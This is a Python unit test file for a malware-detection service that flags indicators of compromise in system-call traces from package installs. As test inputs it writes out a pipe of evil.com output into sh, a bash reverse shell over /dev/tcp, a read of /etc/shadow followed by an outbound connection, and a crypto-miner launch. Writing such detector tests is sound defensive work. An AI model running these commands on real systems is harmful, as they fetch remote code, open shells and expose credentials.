"""
test_ioc_detector.py — Unit tests for the DynamicIOCDetector.
"""

from app.services.ioc_detector import DynamicIOCDetector


def test_detects_public_ip_in_connect() -> None:
    detector = DynamicIOCDetector()
    detector.observe_line('PHASE:install|123 1700.123 connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("8.8.8.8")}, 16) = 0')
    evidence = detector.build_evidence()
    assert evidence.verdict == "malicious"
    assert any("8.8.8.8" in ioc for ioc in evidence.network_iocs)


def test_ignores_private_ip() -> None:
    detector = DynamicIOCDetector()
    detector.observe_line('PHASE:install|123 1700.123 connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("192.168.1.1")}, 16) = 0')
    evidence = detector.build_evidence()
    assert evidence.verdict == "benign"
    assert not evidence.network_iocs


def test_detects_suspicious_port() -> None:
    detector = DynamicIOCDetector()
    # No longer malicious on port alone. Wait, the old rule was suspicious_port.
    # The new rule clusters reverse shells (dup2) and network connects.
    # We will test dup2 reverse shell instead of suspicious port.
    detector.observe_line('PHASE:install|123 1700.123 dup2(3, 0) = 0')
    # wait, dup2 doesn't log port in the strace directly unless we pass the fd. Our new rule is: if syscall in ("dup2", "dup3"): if ("<TCP" in args_str or "<UDP" in args_str)
    detector.observe_line('PHASE:install|123 1700.123 dup2(3<TCP:[10.0.0.1:4444]>, 1) = 0')
    evidence = detector.build_evidence()
    assert evidence.verdict == "malicious"
    assert any("stdio_redirected_to_socket" in ioc for ioc in evidence.process_iocs)


def test_detects_sensitive_file_access() -> None:
    detector = DynamicIOCDetector()
    detector.observe_line('PHASE:install|123 1700.123 openat(AT_FDCWD, "/etc/shadow", O_RDONLY) = 3')
    detector.observe_line('PHASE:install|123 1700.123 connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("8.8.8.8")}, 16) = 0')
    evidence = detector.build_evidence()
    assert evidence.verdict == "malicious"
    assert any("/etc/shadow" in ioc for ioc in evidence.file_iocs)


def test_detects_suspicious_exec() -> None:
    detector = DynamicIOCDetector()
    detector.observe_line('PHASE:install|123 1700.123 execve("/bin/sh", ["/bin/sh", "-c", "curl http://evil.com | sh"], ...) = 0')
    evidence = detector.build_evidence()
    assert evidence.verdict == "benign" # It's a corroborating signal +25 (needs 30 for suspicious)
    assert evidence.process_iocs


def test_detects_crypto_miner() -> None:
    detector = DynamicIOCDetector()
    detector.observe_line('PHASE:install|123 1700.123 execve("/usr/bin/xmrig", ["xmrig", "--url", "stratum+tcp://pool.example.com:3333"], ...) = 0')
    evidence = detector.build_evidence()
    assert evidence.crypto_iocs


def test_detects_reverse_shell() -> None:
    detector = DynamicIOCDetector()
    detector.observe_line('STDOUT:install|bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')
    evidence = detector.build_evidence()
    assert evidence.verdict == "malicious"
    assert any("reverse_shell" in ioc for ioc in evidence.process_iocs)


def test_benign_when_no_iocs() -> None:
    detector = DynamicIOCDetector()
    detector.observe_line("PHASE:install|123 1700.123 read(3, '#!/usr/bin/env python3', 4096) = 22")
    detector.observe_line("PHASE:install|123 1700.123 write(1, 'Hello, World!', 13) = 13")
    evidence = detector.build_evidence()
    assert evidence.verdict == "benign"
    assert not evidence.dynamic_hit
